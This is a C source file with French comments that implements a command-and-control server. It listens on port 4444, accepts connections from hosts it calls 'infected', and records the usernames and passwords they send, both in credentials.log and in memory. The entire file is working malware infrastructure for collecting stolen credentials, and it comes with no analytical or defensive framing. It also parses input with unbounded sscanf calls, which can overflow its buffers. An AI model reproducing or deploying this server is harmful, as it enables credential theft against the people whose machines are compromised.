#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define PORT 4444
#define BUFFER_SIZE 1024

// Structure pour stocker les informations des hôtes infectés
typedef struct {
    char ip[INET_ADDRSTRLEN];
    char username[BUFFER_SIZE];
    char password[BUFFER_SIZE];
} InfectedHost;

// Liste des hôtes infectés (max 100 pour l’exemple)
InfectedHost infected_hosts[100];
int infected_count = 0;

// Fonction pour stocker les données dans un fichier et en mémoire
void save_data(const char *ip, const char *data) {
    FILE *fp = fopen("credentials.log", "a");
    if (fp == NULL) {
        perror("Erreur ouverture fichier");
        return;
    }
    fprintf(fp, "[%s] %s\n", ip, data);
    fclose(fp);

    // Stocker en mémoire
    if (infected_count < 100) {
        sscanf(data, "[+] Username : %s | Mot de passe : %s", infected_hosts[infected_count].username, infected_hosts[infected_count].password);
        strncpy(infected_hosts[infected_count].ip, ip, INET_ADDRSTRLEN);
        infected_count++;
    }
}

int main() {
    int server_fd, new_socket;
    struct sockaddr_in server_addr, client_addr;
    socklen_t addr_size;
    char buffer[BUFFER_SIZE];

    // Création du socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd == -1) {
        perror("Erreur création socket");
        exit(1);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    // Liaison du socket
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        perror("Erreur bind");
        exit(1);
    }

    // Écoute des connexions entrantes
    if (listen(server_fd, 5) < 0) {
        perror("Erreur listen");
        exit(1);
    }

    printf("Serveur C2 en écoute sur le port %d...\n", PORT);

    while (1) {
        addr_size = sizeof(client_addr);
        new_socket = accept(server_fd, (struct sockaddr*)&client_addr, &addr_size);
        if (new_socket < 0) {
            perror("Erreur accept");
            continue;
        }

        memset(buffer, 0, BUFFER_SIZE);
        read(new_socket, buffer, BUFFER_SIZE);

        char client_ip[INET_ADDRSTRLEN];
        inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, INET_ADDRSTRLEN);
        
        printf("[INFO] Reçu de %s : %s\n", client_ip, buffer);
        save_data(client_ip, buffer);  // Sauvegarde des credentials

        close(new_socket);
    }

    return 0;
}
